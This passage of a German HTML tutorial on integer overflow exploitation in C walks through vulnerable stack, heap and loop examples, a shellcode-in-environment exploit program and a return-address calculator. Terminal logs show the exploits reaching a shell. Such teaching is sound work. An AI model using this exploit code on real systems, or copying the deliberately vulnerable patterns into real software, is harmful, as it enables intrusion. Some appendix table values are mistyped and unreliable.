+                  <font color="#003399">&nbsp;&nbsp;char</font> *tmp, *buf;<br>
+                  &nbsp;&nbsp;uint32_t retaddr;</font> </p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;if</font>
+                  (argc &lt; 2)<br>
+                  <font color="#003399">&nbsp;&nbsp;return</font> -1;</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;sscanf(argv[1],&quot;%x&quot;,
+                  &amp;retaddr);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;tmp
+                  = malloc(16);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;if</font>
+                  (retaddr &gt; 0x7fffffff)<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;sprintf(tmp, &quot;%d&quot;, retaddr-0xffffffff-1);<br>
+                  <font color="#003399">&nbsp;&nbsp;else</font><br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;sprintf(tmp, &quot;%u&quot;, retaddr);<br>
+                  <br>
+                  &nbsp;&nbsp;buf = (<font color="#003399">char</font> *)malloc(ENV_SIZE
+                  + 1);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;memset(buf,
+                  0x90, (ENV_SIZE - strlen(lnxsh)));<br>
+                  &nbsp;&nbsp;memcpy(buf + (ENV_SIZE - strlen(lnxsh)), lnxsh,
+                  strlen(lnxsh));<br>
+                  &nbsp;&nbsp;setenv(&quot;EXEC&quot;, buf, 1);<br>
+                  &nbsp;&nbsp;free(buf);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;printf(&quot;{-}
+                  used return address: 0x%x\n&quot;, retaddr);<br>
+                  &nbsp;&nbsp;printf(&quot;{-} execute program : %s %s %s\n\n&quot;,PATH,argv[2],
+                  tmp);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;execl(PATH,
+                  PATH, argv[2], tmp,0);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;free(tmp);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;return</font>
+                  0;<br>
+                  }</font></p></td>
+            </tr>
+          </table>
+          <p><br>
+            <font size="2" face="Verdana, Arial, Helvetica, sans-serif">posidron$
+            gcc </font><font face="Verdana, Arial, Helvetica, sans-serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font color="#000000">eg2_</font></font></font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">exp</font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">.c
+            -o </font><font face="Verdana, Arial, Helvetica, sans-serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font color="#000000">eg2_</font></font></font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">exp</font></p>
+          <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+            Bauen wir uns ein kleines snipplet um die return Addresse f&uuml;r
+            unser Exploit berechnen.</font><br>
+          </p>
+          <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFCC">
+            <tr align="left" valign="top" bgcolor="#FFFFFF">
+              <td width="6%" height="240"><font size="2" face="Courier New, Courier, mono">01:<br>
+                02: <br>
+                03:<br>
+                04:<br>
+                05:<br>
+                06:<br>
+                07:<br>
+                08:<br>
+                09:<br>
+                10:<br>
+                11:<br>
+                12:<br>
+                13:<br>
+                14:<br>
+                15: </font></td>
+              <td width="94%" bgcolor="#FFFFFF"><font face="Courier New, Courier, mono"><font size="2"><font color="#003399">#include</font>
+                &lt;stdio.h&gt;<br>
+                <font color="#003399">#include</font> &lt;inttypes.h&gt;</font>
+                <font color="#003399" size="2"><br>
+                <br>
+                int main</font><font size="2"> (<font color="#003399">int</font>
+                argc, <font color="#003399">char</font> **argv) {<br>
+                &nbsp;&nbsp;int32_t s_top = 0xbfffffff; <font color="#006600">/*
+                top of stack */</font><br>
+                &nbsp;&nbsp;int32_t bsize; &nbsp;&nbsp;<br>
+                <br>
+                &nbsp;&nbsp;bsize = atoi(argv[1]); &nbsp;&nbsp;<br>
+                <br>
+                &nbsp;&nbsp;printf(&quot;top: 0x%08x\n&quot;, s_top);<br>
+                &nbsp;&nbsp;printf(&quot;jmp: - 0x%08x(%d)\n&quot;, bsize, bsize);<br>
+                &nbsp;&nbsp;printf(&quot;ptr: 0x%08x\n&quot;, (s_top - bsize));
+                <font color="#003399">&nbsp;&nbsp;<br>
+                <br>
+                &nbsp;&nbsp;return</font> 0;<br>
+                } </font></font></td>
+            </tr>
+          </table>
+          <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">posidron$
+            gcc stack.c -o stack<br>
+            posidron$ ./stack 4096<br>
+            top: 0xbfffffff<br>
+            jmp: - 0x00001000(4096)<br>
+            ptr: 0xbfffefff<br>
+            posidron$<br>
+            posidron$ </font><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">./</font><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font color="#000000">eg2_</font></font></font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">exp
+            0xbffffeff -2147483615<br>
+            {-} return address: 0xbfffefff<br>
+            {-} command line: </font><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">./</font><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font color="#000000">eg2_array</font></font></font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+            -2147483615 -1073745921<br>
+            array[-2147483615] = -1073745921<br>
+            sh-2.05a$ exit<br>
+            posidron$</font></p>
+          <p>&nbsp;</p>
+          <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FF9933">
+            <tr>
+              <td bgcolor="#FFCC66"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Heap
+                Based Integer Overflow</strong></font></td>
+            </tr>
+          </table>
+          <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">In diesem
+            Beispiel allokieren wir nun speicher f&uuml;r unsere Variable &quot;array&quot;
+            auf dem Heap. Folgende zwei Funktionen stellt uns die ANSI C Library
+            zur verf&uuml;gung:<br>
+            <br>
+            <font color="#003399">void</font> *calloc(size_t nmemb, size_t size);<br>
+            <font color="#003399">void</font> *malloc(size_t size);<br>
+            <br>
+            Beide dieser Funktionen verlangen einen unsigned int (size_t) als
+            Gr&ouml;&szlig;e des zu allokierten Objektes. Somit wird der Variable
+            arrray ein Positiven Wertebereich zugewiesen, in diesem Fall die grosze
+            eines Integer Wertes multipliziert mit 8, also 32 Byte.</font></p>
+          <table width="100%" border="0" cellpadding="0" cellspacing="0">
+            <tr valign="top">
+              <td width="6%"><font size="2" face="Courier New, Courier, mono">01:<br>
+                02:<br>
+                03:<br>
+                04:<br>
+                05:<br>
+                06:<br>
+                07:<br>
+                08:<br>
+                09:<br>
+                10:<br>
+                11:<br>
+                12:<br>
+                13:<br>
+                14:<br>
+                15:<br>
+                16:<br>
+                17:<br>
+                18:<br>
+                19:<br>
+                20:<br>
+                21:<br>
+                22:<br>
+                23:<br>
+                24:<br>
+                25:<br>
+                26:<br>
+                27:<br>
+                28:<br>
+                29:<br>
+                30:<br>
+                31:<br>
+                32:<br>
+                33:<br>
+                34:<br>
+                35:<br>
+                36:<br>
+                37:<br>
+                38:<br>
+                39: </font></td>
+              <td width="94%"><p><font size="2" face="Courier New, Courier, mono"><font color="#003399">#include</font>
+                  &lt;stdio.h&gt;<br>
+                  <font color="#003399">#include</font> &lt;stdlib.h&gt;<br>
+                  <font color="#003399">#include</font> &lt;unistd.h&gt;<br>
+                  <font color="#003399">#include</font> &lt;inttypes.h&gt;</font>
+                </p>
+                <p><font color="#003399" size="2" face="Courier New, Courier, mono">#define</font><font size="2" face="Courier New, Courier, mono">
+                  MAX_SIZE 32</font></p>
+                <p><font color="#003399" size="2" face="Courier New, Courier, mono">int</font><font size="2" face="Courier New, Courier, mono">
+                  fill(int32_t i, int32_t val) {<br>
+                  &nbsp;&nbsp;int32_t *array;<br>
+                  <br>
+                  &nbsp;&nbsp;array = malloc(<font color="#003399">sizeof</font>
+                  (int32_t) * 8);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;if</font>(i
+                  &gt;= MAX_SIZE) {<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;too big, exiting!...\n&quot;);<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                  &nbsp;&nbsp;}<br>
+                  <font color="#003399">&nbsp;&nbsp;else</font> {<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;*(array+i) = val;<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;array[%d] = %d\n&quot;,
+                  i, val);<br>
+                  &nbsp;&nbsp;}</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;return</font>
+                  0;<br>
+                  }</font></p>
+                <p><font color="#003399" size="2" face="Courier New, Courier, mono">int
+                  main</font><font size="2" face="Courier New, Courier, mono">(<font color="#003399">int</font>
+                  argc, <font color="#003399">char</font> **argv){<br>
+                  &nbsp;&nbsp;int32_t i, val;</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;if</font>(argc
+                  &lt; 3)<br>
+                  <font color="#003399">&nbsp;&nbsp;&nbsp;&nbsp;return</font>
+                  -1;</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;i
+                  = atoi(argv[1]);<br>
+                  &nbsp;&nbsp;val = atoi(argv[2]);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;fill(i,
+                  val);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;return</font>
+                  0;<br>
+                  }</font></p></td>
+            </tr>
+          </table>
+          <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+            posidron$ gcc eg3_malloc.c -o eg3_malloc<br>
+            posidron$ ulimit -c unlimited<br>
+            posidron$ ./eg3_malloc -11 8<br>
+            Segmentation fault (core dumped)<br>
+            posidron$ <br>
+            posidron$ gdb -q -c core<br>
+            Core was generated by `./eg3_malloc -11 9'.<br>
+            Program terminated with signal 11, Segmentation fault.<br>
+            #0 0x00000009 in ?? ()<br>
+            posidron$<br>
+            posidron$ ./eg2_exp 0xbffffeff -11<br>
+            {-} return address: 0xbfffefff<br>
+            {-} command line: ./eg3_malloc -11 -1073745921<br>
+            sh-2.05a$ exit<br>
+            posidron$<br>
+            <br>
+            <br>
+            <br>
+            </font></p>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td bgcolor="#FFCC66"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Loop
+                Condition Overflow</strong></font></td>
+            </tr>
+          </table>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif"> <br>
+          Folgend wird demonstriert, wie sich ein Integer Overflow in einer Schleife
+          ausgenutz weden k&ouml;nnte. Dabei &uuml;bergeben wir die L&auml;nge
+          des Strings selber an das Programm.<br>
+          <br>
+          </font>
+          <table width="100%" border="0" cellpadding="0" cellspacing="0" bordercolor="#000000" bgcolor="#FFFFCC">
+            <tr align="left" valign="top" bgcolor="#FFFFFF">
+              <td width="5%" height="400"><font size="2" face="Courier New, Courier, mono">01:<br>
+                02: <br>
+                03:<br>
+                04:<br>
+                05:<br>
+                07:<br>
+                08:<br>
+                09:<br>
+                10:<br>
+                11:<br>
+                12:<br>
+                13:<br>
+                14:<br>
+                15:<br>
+                16:<br>
+                17:<br>
+                18:<br>
+                19:<br>
+                20:<br>
+                21:<br>
+                22:<br>
+                23:<br>
+                24:<br>
+                25:<br>
+                26:</font></td>
+              <td width="95%"><font size="2" face="Courier New, Courier, mono"><font color="#003399">#include</font>
+                &lt;stdio.h&gt;<br>
+                <font color="#003399">#include</font> &lt;stdlib.h&gt;<br>
+                <font color="#003399">#include</font> &lt;string.h&gt;<br>
+                <font color="#003399">#include</font> &lt;inttypes.h&gt;<br>
+                <br>
+                <font color="#003399">int</font><font size="2" face="Courier New, Courier, mono">
+                <font color="#003399">main</font> (<font color="#003399">int</font>
+                argc, <font color="#003399">char</font> **argv) {<br>
+                </font></font><font size="2" face="Courier New, Courier, mono">
+                &nbsp;&nbsp;uint32_t len, i;<br>
+                &nbsp;&nbsp;<font color="#003399">char</font> *buf;</font> <font size="2" face="Courier New, Courier, mono">
+                &nbsp;&nbsp;<br>
+                <br>
+                &nbsp;&nbsp;len = atoi(argv[1]);</font><font size="2" face="Courier New, Courier, mono">
+                &nbsp;&nbsp;<br>
+                <br>
+                <font color="#003399">&nbsp;&nbsp;if</font> (<font color="#000000">len</font>
+                &gt; 0) {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;buf = malloc(len * <font color="#003399">sizeof</font>
+                (<font color="#003399">char</font> *));</font><font size="2" face="Courier New, Courier, mono">
+                &nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                &nbsp;&nbsp;&nbsp; <font color="#003399">for</font> (i = 0; i
+                &lt; len; i++) {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buf[i] = argv[2][i];<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                &nbsp;&nbsp;}</font><font size="2" face="Courier New, Courier, mono">
+                &nbsp;&nbsp;<br>
+                <br>
+                &nbsp; buf[len] = '\0';</font><font size="2" face="Courier New, Courier, mono">
+                &nbsp;&nbsp;<br>
+                &nbsp;<br>
+                &nbsp; printf(&quot;%s\n&quot;, buf);</font><font size="2" face="Courier New, Courier, mono">
+                &nbsp;&nbsp;<br>
+                <br>
+                &nbsp; <font color="#003399">return</font> 0;<br>
+                }</font></td>
+            </tr>
+          </table>
+          <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+            posidron$ gcc eg4_loop.c -o eg4_loop<br>
+            posidron$ ./eg4_loop 5 hello<br>
+            hello<br>
+            posidron$<br>
+            <br>
+            <br>
+            UINT_MAX = 4294967295 / 4 = 1073741823,75<br>
+            1073741828 * 4 = 4294967312<br>
+            4294967295 - 4294967312 = 17<br>
+            <br>
+            17 bytes wuerde malloc() fuer unsere Variable &quot;buf&quot; allokieren,
+            wenn wir 1073741828 als argument f&uuml;r die multplikation an malloc()
+            &uuml;bergeben.<br>
+            <br>
+            posidron$ ./eg4_loop 1073741828 `python -c 'print &quot;a&quot;*200'`<br>
+            <br>
+            <br>
+            <br>
+            </font></p>
+
+          <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+            </font> <font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+            So, das wars, in der Hoffnung das der ein oder andere das Thema nun
+            besser verstanden hat.<br>
+            <br>
+            <br>
+            posidron$ logout<br>
+            </font> </p>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td bgcolor="#FFCC66"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Anhang</font></strong></font></td>
+            </tr>
+          </table>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+          <br>
+          <strong> Integer Konvertierung</strong><br>
+          </font><br>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr bgcolor="#FFCC66">
+              <td width="23%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Quell-Gr&ouml;&szlig;e</font></strong></td>
+              <td width="22%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Quell-Wert
+                </font></strong></td>
+              <td width="24%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Ziel-Gr&ouml;&szlig;e</font></strong></td>
+              <td width="31%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Ziel-Wert</font></strong></td>
+            </tr>
+            <tr bgcolor="#E3FDD0">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">16
+                bit signed</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-1
+                (0xffff)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32
+                bit unsigned</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">4294967295
+                (0xffffffff) </font></td>
+            </tr>
+            <tr bgcolor="#E3FDD0">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">16
+                bit signed</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-1
+                (0xffff)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32
+                bit signed</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-1
+                (0xffffffff)</font></td>
+            </tr>
+            <tr bgcolor="#E3FDD0">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">16
+                bit unsigned</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">65535
+                (0xffff) </font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32
+                bit unsigned</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">65535
+                (0xffff) </font></td>
+            </tr>
+            <tr bgcolor="#E3FDD0">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">16
+                bit unsdigned</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">65535
+                (0xffff) </font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32
+                bit signed</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">65535
+                (0xffff) </font></td>
+            </tr>
+            <tr bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32
+                bit signed</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-1
+                (0xffffffff) </font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">16
+                bit unsigned</font></td>
+              <td bgcolor="#CDFCAB"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">65535
+                (0xffff) </font></td>
+            </tr>
+            <tr bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32
+                bit signed</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-1
+                (0xffffffff) </font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">16
+                bit signed</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">65535
+                (0xffff) </font></td>
+            </tr>
+            <tr bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32
+                bit unsigned</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32768
+                (0x8000)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">16
+                bit unsigned</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32768
+                (0x8000)</font></td>
+            </tr>
+            <tr bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32
+                bit unsigned</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">32768
+                (0x8000)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">16
+                bit signed</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-32768
+                (0x8000)</font></td>
+            </tr>
+          </table>
+          <br>
+          <br>
+          <strong><font color="#000000" size="2" face="Verdana, Arial, Helvetica, sans-serif">Datentyp
+          Integer</font></strong><br>
+          <br>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr valign="top" bgcolor="#FFCC66">
+              <td width="26%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">System</font></strong></td>
+              <td width="14%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Gr&ouml;&szlig;e</font></strong></td>
+              <td width="38%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Wertebereich</font></strong></td>
+              <td width="22%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Formatzeichen</font></strong></td>
+            </tr>
+            <tr valign="top" bgcolor="#E3FDD0">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">ANSI
+                C </font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+                2 Byte</font></td>
+              <td bgcolor="#E3FDD0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-32768...
+                32767</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%d
+                oder %i</font></td>
+            </tr>
+            <tr valign="top" bgcolor="#E3FDD0">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">MS-DOS,
+                Win3.1 </font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+                2 Byte</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-32768...
+                32767</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%d
+                oder %i</font></td>
+            </tr>
+            <tr valign="top" bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Mac.
+                Metrowerks CW</font></td>
+              <td bgcolor="#CDFCAB"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+                4 Byte</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-2147483648...
+                2147483647</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%d
+                oder %i</font></td>
+            </tr>
+            <tr valign="top" bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Win98/2000/NT/XP</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+                4 Byte</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-2147483648...
+                2147483647</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%d
+                oder %i</font></td>
+            </tr>
+            <tr valign="top" bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Linux</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+                4 Byte</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-2147483648...
+                2147483647</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%d
+                oder %i</font></td>
+            </tr>
+          </table>
+          <br>
+          <br>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr valign="top" bgcolor="#FFCC66">
+              <td width="26%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Typ</font></strong></td>
+              <td width="24%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Gr&ouml;&szlig;e</font></strong></td>
+              <td width="50%"><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Wertebereich</font></strong></td>
+            </tr>
+            <tr valign="top" bgcolor="#E3FDD0">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">short,
+                signed shor</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">2
+                Byte (16 Bit)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-32768...
+                32767</font></td>
+            </tr>
+            <tr valign="top" bgcolor="#E3FDD0">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">unsigned
+                short</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+                2 Byte (16 Bit)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">0...
+                65535</font></td>
+            </tr>
+            <tr valign="top" bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">int,
+                signed int</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">4
+                Byte (32 Bit)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-2147483648...
+                2147483647</font></td>
+            </tr>
+            <tr valign="top" bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">unsigned
+                int</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">4
+                Byte (32 Bit)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">0...
+                4294967295</font></td>
+            </tr>
+            <tr valign="top" bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">long,
+                signed long</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">4
+                Byte (32 Bit)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-2147483648...
+                2147483647</font></td>
+            </tr>
+            <tr valign="top" bgcolor="#CDFCAB">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">unsigned
+                long</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">4
+                Byte (32 Bit)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">0...
+                4294967295</font></td>
+            </tr>
+            <tr valign="top" bgcolor="#BBFB8C">
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">long
+                long</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">8
+                Byte (64 Bit)</font></td>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-9.223.372.036.854.755.807...
+                9.223.372.036.854.755.807</font></td>
+            </tr>
+          </table>
+          <br>
+          <br>
+          <strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Referenz</font></strong><font color="#000000"><br>
+          <br>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif">Basic Integer
+          Overflows - <em>http://www.phrack.org/phrack/60/p60-0x0a.txt </em><br>
+          Integer Array Overflows - <em>http://www.fakehalo.us/IAO-paper.txt</em></font></font></div></td>
+    </tr>
+  </table>
+  <div align="left"></div>
+</div>
+</body>
+</html>
